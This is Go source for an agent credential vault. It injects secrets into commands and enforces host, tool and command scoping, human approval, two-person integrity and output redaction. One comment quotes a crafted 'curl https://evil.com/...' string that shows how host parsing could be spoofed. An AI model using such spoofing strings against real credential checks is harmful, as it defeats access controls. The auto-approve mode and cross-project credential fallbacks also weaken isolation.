package vault

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Errors
var (
	ErrNotFound          = errors.New("credential not found")
	ErrExpired           = errors.New("credential has expired")
	ErrUnauthorized      = errors.New("unauthorized access to credential")
	ErrHostNotAllowed    = errors.New("credential not allowed for this host")
	ErrToolNotAllowed    = errors.New("credential not allowed for this tool")
	ErrCommandNotAllowed = errors.New("credential not allowed for this command")
	ErrApprovalRequired  = errors.New("credential access requires approval")
	ErrVaultLocked       = errors.New("vault is locked")
	// ErrHostUnverifiable is returned when a credential is host-scoped but the
	// target host cannot be determined from the request (deny on ambiguity).
	ErrHostUnverifiable = errors.New("credential is host-restricted but target host could not be verified; pass an explicit host")
	// ErrTwoPersonRequired is returned when a credential is protected by
	// Two-Person Integrity and therefore CANNOT be used via the normal single
	// -principal Execute path. It must go through the two-person approval broker
	// (a distinct second approver is required to reconstruct the secret).
	ErrTwoPersonRequired = errors.New("credential requires two-person approval; use the two-person flow (a second, distinct approver must approve)")
	// ErrEmptySecretInjection is a defensive backstop: refuse to run a command
	// with an env/file credential whose resolved secret is empty (which would
	// silently execute unauthenticated).
	ErrEmptySecretInjection = errors.New("refusing to inject an empty secret (credential unavailable on this machine or misconfigured)")
)

// ApprovalError is a structured, resumable approval request. Unlike a bare
// ErrApprovalRequired, it carries everything the UI needs to prompt the human
// and everything the agent needs to retry after approval (the ApprovalID).
type ApprovalError struct {
	ApprovalID   string
	CredentialID string
	Command      string
	Reason       string
}

func (e *ApprovalError) Error() string {
	return fmt.Sprintf("approval required for credential %q (approvalId %s): have the user approve, then retry with this approvalId", e.CredentialID, e.ApprovalID)
}

// Is lets errors.Is(err, ErrApprovalRequired) match an *ApprovalError.
func (e *ApprovalError) Is(target error) bool {
	return target == ErrApprovalRequired
}

// Storage interface for credential persistence.
type Storage interface {
	// CRUD operations
	Store(ctx context.Context, cred Credential) error
	Retrieve(ctx context.Context, id string) (*Credential, error)
	Delete(ctx context.Context, id string) error
	List(ctx context.Context, filter CredentialFilter) ([]Credential, error)

	// Scope-aware retrieval
	RetrieveForExecution(ctx context.Context, id string, projectID string) (*Credential, error)

	// Update last used time
	UpdateLastUsed(ctx context.Context, id string) error
}

// Vault manages credentials with scope hierarchy.
type Vault struct {
	globalStorage  Storage
	projectStorage map[string]Storage // projectID -> storage
	config         VaultConfig
	mu             sync.RWMutex
}

// NewVault creates a new vault with global storage.
func NewVault(globalStorage Storage, config VaultConfig) *Vault {
	return &Vault{
		globalStorage:  globalStorage,
		projectStorage: make(map[string]Storage),
		config:         config,
	}
}

// AddProjectStorage adds project-specific storage.
func (v *Vault) AddProjectStorage(projectID string, storage Storage) {
	v.mu.Lock()
	defer v.mu.Unlock()
	v.projectStorage[projectID] = storage
}

// ResolveCredential resolves a credential from global or project storage.
// Project storage is checked first, then falls back to global.
func (v *Vault) ResolveCredential(ctx context.Context, id string, projectID string) (*Credential, error) {
	// Check project storage first
	if projectID != "" {
		v.mu.RLock()
		storage, ok := v.projectStorage[projectID]
		v.mu.RUnlock()

		if ok {
			cred, err := storage.Retrieve(ctx, id)
			if err == nil {
				return cred, nil
			}
			if !errors.Is(err, ErrNotFound) {
				return nil, err
			}
		}
	}

	if cred, err := v.globalStorage.Retrieve(ctx, id); err == nil {
		return cred, nil
	} else if !errors.Is(err, ErrNotFound) {
		return nil, err
	}
	v.mu.RLock()
	stores := make([]Storage, 0, len(v.projectStorage))
	for _, storage := range v.projectStorage {
		stores = append(stores, storage)
	}
	v.mu.RUnlock()
	for _, storage := range stores {
		cred, err := storage.Retrieve(ctx, id)
		if err == nil {
			return cred, nil
		}
		if !errors.Is(err, ErrNotFound) {
			return nil, err
		}
	}
	return nil, ErrNotFound
}

// twoPersonAware is implemented by storages that protect credentials with
// Two-Person Integrity (only TwoPersonStorage today).
type twoPersonAware interface {
	IsTwoPerson(id string) bool
	GetEnvelope(id string) (*TwoPersonEnvelope, error)
}

// resolveTwoPersonStorage returns the two-person storage holding id (project
// storage first, then global), or nil if the credential is not two-person.
func (v *Vault) resolveTwoPersonStorage(id string, projectID string) twoPersonAware {
	if projectID != "" {
		v.mu.RLock()
		storage, ok := v.projectStorage[projectID]
		v.mu.RUnlock()
		if ok {
			if tp, isTP := storage.(twoPersonAware); isTP && tp.IsTwoPerson(id) {
				return tp
			}
		}
	}
	if tp, isTP := v.globalStorage.(twoPersonAware); isTP && tp.IsTwoPerson(id) {
		return tp
	}
	return nil
}

// IsTwoPerson reports whether the credential id is protected by Two-Person
// Integrity in the storage that would resolve it (project storage first, then
// global). Used by the executor to refuse the normal single-principal path.
func (v *Vault) IsTwoPerson(id string, projectID string) bool {
	return v.resolveTwoPersonStorage(id, projectID) != nil
}

// ResolveTwoPersonEnvelope returns the protected envelope for a two-person
// credential, or an error if it is not two-person.
func (v *Vault) ResolveTwoPersonEnvelope(id string, projectID string) (*TwoPersonEnvelope, error) {
	tp := v.resolveTwoPersonStorage(id, projectID)
	if tp == nil {
		return nil, ErrNotFound
	}
	return tp.GetEnvelope(id)
}

// Store stores a credential in the appropriate storage.
func (v *Vault) Store(ctx context.Context, cred Credential) error {
	if cred.Scope == ScopeProject && cred.ProjectID != "" {
		v.mu.RLock()
		storage, ok := v.projectStorage[cred.ProjectID]
		v.mu.RUnlock()

		if !ok {
			return fmt.Errorf("no storage for project %s", cred.ProjectID)
		}
		return storage.Store(ctx, cred)
	}

	return v.globalStorage.Store(ctx, cred)
}

// Delete removes a credential.
func (v *Vault) Delete(ctx context.Context, id string, projectID string) error {
	if projectID != "" {
		v.mu.RLock()
		storage, ok := v.projectStorage[projectID]
		v.mu.RUnlock()

		if ok {
			return storage.Delete(ctx, id)
		}
	}
	return v.globalStorage.Delete(ctx, id)
}

// allSecrets returns every credential secret known to the vault (global + all
// project storages). Used to scrub sibling secrets from command output so that
// a command which happens to echo an unrelated stored secret cannot leak it.
func (v *Vault) allSecrets(ctx context.Context) []string {
	filter := CredentialFilter{IncludeExpired: true, IncludeSecrets: true}
	seen := make(map[string]bool)
	var secrets []string

	add := func(creds []Credential) {
		for _, c := range creds {
			if c.Secret != "" && !seen[c.Secret] {
				seen[c.Secret] = true
				secrets = append(secrets, c.Secret)
			}
		}
	}

	if creds, err := v.globalStorage.List(ctx, filter); err == nil {
		add(creds)
	}

	v.mu.RLock()
	stores := make([]Storage, 0, len(v.projectStorage))
	for _, s := range v.projectStorage {
		stores = append(stores, s)
	}
	v.mu.RUnlock()

	for _, s := range stores {
		if creds, err := s.List(ctx, filter); err == nil {
			add(creds)
		}
	}

	return secrets
}

// List lists credentials from all accessible storage.
func (v *Vault) List(ctx context.Context, filter CredentialFilter, projectID string) ([]Credential, error) {
	var result []Credential
	seen := make(map[string]bool)

	// Add from project storage
	if projectID != "" {
		v.mu.RLock()
		storage, ok := v.projectStorage[projectID]
		v.mu.RUnlock()

		if ok {
			creds, err := storage.List(ctx, filter)
			if err != nil {
				return nil, err
			}
			for _, c := range creds {
				if !seen[c.ID] {
					result = append(result, c)
					seen[c.ID] = true
				}
			}
		}
	}

	// Add from global storage
	if filter.Scope == "" || filter.Scope == ScopeGlobal {
		creds, err := v.globalStorage.List(ctx, filter)
		if err != nil {
			return nil, err
		}
		for _, c := range creds {
			if !seen[c.ID] {
				result = append(result, c)
				seen[c.ID] = true
			}
		}
	}

	// Include legacy project stores so unlocked credentials are shared.
	v.mu.RLock()
	stores := make([]Storage, 0, len(v.projectStorage))
	for _, storage := range v.projectStorage {
		stores = append(stores, storage)
	}
	v.mu.RUnlock()
	for _, storage := range stores {
		creds, err := storage.List(ctx, filter)
		if err != nil {
			return nil, err
		}
		for _, c := range creds {
			if !seen[c.ID] {
				result = append(result, c)
				seen[c.ID] = true
			}
		}
	}
	return result, nil
}

// grantEntry records an approval grant scoped to a command pattern with an
// optional expiry. A zero expiresAt means the grant never expires within the
// session; an empty commandPattern matches any command.
type grantEntry struct {
	commandPattern string
	expiresAt      time.Time // zero = no expiry
}

// pendingApproval is an access request awaiting human approval.
type pendingApproval struct {
	credID  string
	command string
	reason  string
	created time.Time
}

// DefaultGrantTTL is how long an approval grant remains valid once given.
const DefaultGrantTTL = 15 * time.Minute

// Executor executes commands with credentials and redacts output.
type Executor struct {
	vault     *Vault
	redactor  *OutputRedactor
	config    VaultConfig
	auditor   Auditor
	mu        sync.RWMutex
	grants    map[string][]grantEntry    // credID -> scoped grants
	pending   map[string]pendingApproval // approvalID -> request
	grantTTL  time.Duration
	twoPerson *twoPersonBroker // two-person approval broker (2-of-N creds)
}

// NewExecutor creates a new credential executor.
func NewExecutor(vault *Vault, config VaultConfig, auditor Auditor) *Executor {
	return &Executor{
		vault:     vault,
		redactor:  NewOutputRedactor(),
		config:    config,
		auditor:   auditor,
		grants:    make(map[string][]grantEntry),
		pending:   make(map[string]pendingApproval),
		grantTTL:  DefaultGrantTTL,
		twoPerson: newTwoPersonBroker(DefaultGrantTTL),
	}
}

// Execute executes a command with a credential and returns redacted output.
// The credential value is NEVER exposed - only used internally for execution.
func (e *Executor) Execute(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	// Resolve credential
	cred, err := e.vault.ResolveCredential(ctx, req.CredentialID, req.ProjectID)
	if err != nil {
		return nil, err
	}

	// Two-Person Integrity interlock: a credential protected by 2-of-N CANNOT be
	// used through this single-principal path. Its resolved Secret is empty by
	// design, so proceeding would silently run the command unauthenticated. Refuse
	// and direct the caller to the two-person approval flow.
	if !e.config.TrustedUnlocked && e.vault.IsTwoPerson(req.CredentialID, req.ProjectID) {
		e.audit(cred, req, false, "two_person_required")
		return nil, ErrTwoPersonRequired
	}

	// Check expiration
	if !e.config.TrustedUnlocked && cred.IsExpired() {
		return nil, ErrExpired
	}

	// Check constraints
	if !e.config.TrustedUnlocked && !cred.CanUseTool(req.Tool) {
		e.audit(cred, req, false, "tool_not_allowed")
		return nil, ErrToolNotAllowed
	}

	if !e.config.TrustedUnlocked && !cred.CanUseCommand(req.EffectiveCommandLine()) {
		e.audit(cred, req, false, "command_not_allowed")
		return nil, ErrCommandNotAllowed
	}

	// Host binding: if the credential is host-restricted we MUST be able to
	// determine the target host UNAMBIGUOUSLY. The extractHost heuristic parses
	// adversarial command strings unreliably (e.g. "curl https://evil.com/?x=git@ok"
	// could mis-parse to "ok"), so it is NOT trusted for authorization. We require
	// an explicit req.Host for host-restricted credentials and deny otherwise.
	if !e.config.TrustedUnlocked && len(cred.AllowedHosts) > 0 {
		host := strings.TrimSpace(req.Host)
		if host == "" {
			// Deny on ambiguity rather than trusting a heuristic parse of the command.
			e.audit(cred, req, false, "host_unverifiable")
			return nil, ErrHostUnverifiable
		}
		if !cred.CanUseHost(host) {
			e.audit(cred, req, false, "host_not_allowed")
			return nil, ErrHostNotAllowed
		}
		req.Host = host // record the verified host for auditing
	}

	// Check permission mode. A non-nil error here may be a structured
	// *ApprovalError carrying a resumable ApprovalID.
	if !e.config.TrustedUnlocked {
		if err := e.checkPermission(ctx, cred, req); err != nil {
			return nil, err
		}
	}

	// Execute command with credential
	start := time.Now()
	result, err := e.executeWithCredential(ctx, cred, req)
	duration := time.Since(start)

	if err != nil {
		return nil, err
	}

	result.Duration = duration

	// Update last used
	_ = e.vault.globalStorage.UpdateLastUsed(ctx, cred.ID)

	// Audit successful execution
	e.audit(cred, req, true, "")

	return result, nil
}

// executeWithCredential runs the command with the credential injected.
func (e *Executor) executeWithCredential(ctx context.Context, cred *Credential, req ExecutionRequest) (*ExecutionResult, error) {
	// Defensive backstop against empty-secret injection: for env/file methods an
	// empty secret would silently run the command unauthenticated. Refuse. (The
	// primary guard is the two-person interlock in Execute; this catches any other
	// path that resolves a secretless credential.)
	if cred.Secret == "" && (cred.Inject.Method == InjectEnv || cred.Inject.Method == InjectFile) {
		return nil, ErrEmptySecretInjection
	}

	// Prepare command
	cmd := exec.CommandContext(ctx, req.Command, req.Args...)
	if req.WorkingDir != "" {
		cmd.Dir = req.WorkingDir
	}

	// Inject credential based on method
	env := os.Environ()
	injectedFiles := []string{}

	switch cred.Inject.Method {
	case InjectEnv:
		// Add environment variable
		env = append(env, fmt.Sprintf("%s=%s", cred.Inject.Target, cred.Secret))

	case InjectFile:
		// Write to temporary file
		path, err := e.writeTempFile(cred)
		if err != nil {
			return nil, fmt.Errorf("failed to inject file: %w", err)
		}
		injectedFiles = append(injectedFiles, path)

		// Set env var pointing to file, or inject into command
		if cred.Inject.Target != "" {
			env = append(env, fmt.Sprintf("%s=%s", cred.Inject.Target, path))
		}

	case InjectSSHAgent:
		// TODO: Add key to ssh-agent
		return nil, errors.New("ssh-agent injection not yet implemented")
	}

	cmd.Env = env

	// Capture stdout and stderr SEPARATELY so we can surface the real exit code
	// and real stderr to the caller (previously stderr was dropped and exit code
	// hardcoded to 0 on the success path, blinding the agent to failures).
	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	runErr := cmd.Run()

	// Cleanup injected files regardless of outcome
	for _, path := range injectedFiles {
		os.Remove(path)
	}

	exitCode := 0
	if runErr != nil {
		var exitErr *exec.ExitError
		if errors.As(runErr, &exitErr) {
			exitCode = exitErr.ExitCode()
		} else {
			// Command could not be started (not found, context cancelled, etc.)
			return nil, fmt.Errorf("command execution failed: %w", runErr)
		}
	}

	// Redact output against EVERY known secret, not just the one injected - a
	// command may incidentally print a sibling credential (or the whole env).
	secrets := e.vault.allSecrets(ctx)
	if !secretInList(secrets, cred.Secret) && cred.Secret != "" {
		secrets = append(secrets, cred.Secret)
	}

	// Use a per-invocation redactor so concurrent Execute calls never share
	// mutable hint state (data race) and hints from one command can't bleed into
	// another. Hints accumulate across the stdout then stderr passes.
	redactor := NewOutputRedactor()
	stdout, stdoutRedactions := redactor.RedactAll(stdoutBuf.String(), secrets)
	stderr, stderrRedactions := redactor.RedactAll(stderrBuf.String(), secrets)
	totalRedactions := stdoutRedactions + stderrRedactions

	return &ExecutionResult{
		Stdout:         stdout,
		Stderr:         stderr,
		ExitCode:       exitCode,
		RedactedCount:  totalRedactions,
		RedactionHints: redactor.GetHints(),
		// SafeToParse is true only when nothing was altered - i.e. the output is
		// byte-for-byte the command's real output and safe to parse programmatically.
		SafeToParse: totalRedactions == 0,
	}, nil
}

// writeTempFile writes a credential to a temporary file.
func (e *Executor) writeTempFile(cred *Credential) (string, error) {
	dir := filepath.Join(os.TempDir(), "swarm-vault")
	if err := os.MkdirAll(dir, 0700); err != nil {
		return "", err
	}

	// Use random name
	f, err := os.CreateTemp(dir, "cred-*")
	if err != nil {
		return "", err
	}
	defer f.Close()

	// Set permissions
	perm := os.FileMode(0600)
	if cred.Inject.Permissions > 0 {
		perm = os.FileMode(cred.Inject.Permissions)
	}
	if err := os.Chmod(f.Name(), perm); err != nil {
		return "", err
	}

	// Write secret
	if _, err := f.WriteString(cred.Secret); err != nil {
		return "", err
	}

	return f.Name(), nil
}

// reqKey returns the canonical grant/approval key for a request. It covers the
// command AND its args so that an approval granted for `aws s3 ls` cannot be
// replayed for `aws s3 rm`, and so retrying with the identical invocation hits
// the existing grant instead of looping on approval. Whitespace is normalized.
func reqKey(req ExecutionRequest) string {
	parts := append([]string{strings.TrimSpace(req.Command)}, req.Args...)
	return strings.Join(parts, "\x00")
}

// checkPermission checks if the credential access is allowed based on vault
// mode. It returns nil when access is granted. When approval is needed it
// registers a pending request and returns a structured *ApprovalError whose
// ApprovalID the caller can approve via Approve() and then retry.
func (e *Executor) checkPermission(ctx context.Context, cred *Credential, req ExecutionRequest) error {
	key := reqKey(req)
	// Check if already granted for this specific command + args.
	if e.isGranted(cred.ID, key) {
		return nil
	}

	switch e.config.DefaultMode {
	case ModeYOLO:
		// Auto-approve (grant scoped to this command + args with a TTL).
		e.grant(cred.ID, key)
		return nil

	case ModeDelegated:
		// A trusted interactive host has already applied its own permission
		// policy to this exact tool invocation. Do not open a second vault-only
		// approval loop. Execute has already enforced expiry, credential
		// tool/command/host constraints, and the two-person interlock.
		return nil

	case ModeBalanced:
		// Require approval for sensitive or inherently high-risk credentials
		// (AWS keys, SSH keys, passwords, TLS keys) even if untagged.
		if cred.RequiresApprovalByDefault() {
			return e.requestApproval(cred, req)
		}
		e.grant(cred.ID, key)
		return nil

	case ModeRestrictive:
		// Always require approval.
		return e.requestApproval(cred, req)

	default:
		return e.requestApproval(cred, req)
	}
}

// requestApproval registers a pending approval and returns a structured error.
func (e *Executor) requestApproval(cred *Credential, req ExecutionRequest) error {
	id := newApprovalID()
	e.mu.Lock()
	e.pending[id] = pendingApproval{
		credID:  cred.ID,
		command: reqKey(req), // canonical command+args key used by the grant
		reason:  req.Reason,
		created: time.Now(),
	}
	e.mu.Unlock()

	e.audit(cred, req, false, "approval_required")
	return &ApprovalError{
		ApprovalID:   id,
		CredentialID: cred.ID,
		Command:      strings.TrimSpace(strings.Join(append([]string{req.Command}, req.Args...), " ")),
		Reason:       req.Reason,
	}
}

// Approve consumes a pending approval by ID and records a command-scoped grant
// with the configured TTL. Returns an error if the ID is unknown or consumed.
func (e *Executor) Approve(approvalID string) error {
	e.mu.Lock()
	defer e.mu.Unlock()
	p, ok := e.pending[approvalID]
	if !ok {
		return fmt.Errorf("unknown or already-consumed approvalId %q", approvalID)
	}
	delete(e.pending, approvalID)
	e.grantLocked(p.credID, p.command)
	return nil
}

// newApprovalID returns a short random hex identifier.
func newApprovalID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		// Fall back to a timestamp-based id; collision risk is negligible here.
		return fmt.Sprintf("apr-%d", time.Now().UnixNano())
	}
	return "apr-" + hex.EncodeToString(b)
}

// grant records a command-scoped grant with the executor's TTL.
func (e *Executor) grant(credID, command string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.grantLocked(credID, command)
}

// grantLocked records a grant. Caller must hold e.mu.
func (e *Executor) grantLocked(credID, command string) {
	ttl := e.grantTTL
	var exp time.Time
	if ttl > 0 {
		exp = time.Now().Add(ttl)
	}
	e.grants[credID] = append(e.grants[credID], grantEntry{
		commandPattern: command,
		expiresAt:      exp,
	})
}

// isGranted reports whether a live (unexpired) grant covers this command. A
// grant with an empty commandPattern matches any command (wildcard).
func (e *Executor) isGranted(credID, command string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	entries := e.grants[credID]
	if len(entries) == 0 {
		return false
	}
	now := time.Now()
	live := entries[:0]
	granted := false
	for _, g := range entries {
		if !g.expiresAt.IsZero() && now.After(g.expiresAt) {
			continue // drop expired
		}
		live = append(live, g)
		if g.commandPattern == "" || g.commandPattern == command {
			granted = true
		}
	}
	// Compact out expired grants so the slice doesn't grow unbounded.
	if len(live) == 0 {
		delete(e.grants, credID)
	} else {
		e.grants[credID] = live
	}
	return granted
}

func (e *Executor) audit(cred *Credential, req ExecutionRequest, approved bool, deniedReason string) {
	if e.auditor == nil || !e.config.AuditEnabled {
		return
	}

	// Never write a raw secret into the audit log even if it was passed inline
	// as part of the command string (e.g. `curl -H "Authorization: Bearer xxx"`).
	command := req.Command
	if cred.Secret != "" {
		command = strings.ReplaceAll(command, cred.Secret, "[REDACTED]")
	}

	entry := AuditEntry{
		Timestamp:      time.Now(),
		CredentialID:   cred.ID,
		CredentialName: cred.Name,
		Action:         "execute",
		Tool:           req.Tool,
		Command:        command,
		Host:           req.Host,
		Approved:       approved,
		DeniedReason:   deniedReason,
		ProjectID:      req.ProjectID,
	}
	_ = e.auditor.Record(entry)
}

// secretInList reports whether secret is already present in the slice.
func secretInList(list []string, secret string) bool {
	for _, v := range list {
		if v == secret {
			return true
		}
	}
	return false
}

// extractHost extracts a host from a command string.
// Handles git URLs, SSH, curl, etc.
func extractHost(command string) string {
	// Git URL: git@github.com:user/repo.git
	if strings.Contains(command, "git@") {
		parts := strings.Split(command, "@")
		if len(parts) > 1 {
			hostPart := strings.SplitN(parts[1], ":", 2)
			return hostPart[0]
		}
	}

	// HTTPS URL: https://github.com/user/repo
	if strings.Contains(command, "://") {
		parts := strings.Split(command, "://")
		if len(parts) > 1 {
			hostPart := strings.SplitN(parts[1], "/", 2)
			// Strip credentials from URL
			host := hostPart[0]
			if strings.Contains(host, "@") {
				host = strings.Split(host, "@")[1]
			}
			return host
		}
	}

	// SSH: ssh user@host
	if strings.Contains(command, "ssh ") && strings.Contains(command, "@") {
		parts := strings.Split(command, "@")
		if len(parts) > 1 {
			hostPart := strings.SplitN(parts[len(parts)-1], " ", 2)
			return hostPart[0]
		}
	}

	return ""
}

// Auditor interface for audit logging.
type Auditor interface {
	Record(entry AuditEntry) error
}

// GetRedactor returns the output redactor.
func (e *Executor) GetRedactor() *OutputRedactor {
	return e.redactor
}
